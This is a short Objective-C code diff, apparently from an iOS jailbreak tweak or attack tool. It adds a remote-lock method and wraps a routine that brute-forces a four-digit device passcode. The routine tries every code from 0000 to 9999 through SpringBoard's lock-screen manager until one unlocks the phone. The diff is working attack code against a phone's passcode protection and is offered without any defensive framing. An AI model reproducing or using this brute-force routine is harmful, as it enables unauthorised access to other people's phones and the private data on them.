@@ -24,19 +24,28 @@
 	return [[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
 }
 
+
+-(void)lock {
+	[[SBLockScreenManager sharedInstance] remoteLock:0];
+}
+
 -(NSString *)brute {
-	NSLog(@"[lu.cy] Brute forcing passcode...");
-	for(int i = 0; i <= 9999; i++) {
-		NSString* numb = [@"000" stringByAppendingString:[NSString stringWithFormat:@"%d", i]];
-		NSString* guess = [numb substringFromIndex:[numb length] - 4];
-		BOOL status = [self unlock:guess];
-		NSLog(@"[lu.cy] Guess: %@", guess);
-		if(status){
-			return guess;
+
+	if ([[UIApplication sharedApplication] isProtectedDataAvailable] == 1){
+		
+		NSLog(@"[lu.cy] Brute forcing passcode...");
+		for(int i = 0; i <= 9999; i++) {
+			NSString* numb = [@"000" stringByAppendingString:[NSString stringWithFormat:@"%d", i]];
+			NSString* guess = [numb substringFromIndex:[numb length] - 4];
+			BOOL status = [self unlock:guess];
+			NSLog(@"[lu.cy] Guess: %@", guess);
+			if(status){
+				return guess;
+			}
+			[NSThread sleepForTimeInterval:1];
 		}
-		[NSThread sleepForTimeInterval:1];
+		return @"Unable to brute force passcode";
 	}
-	return @"Unable to brute force passcode";
 }
 
 @end
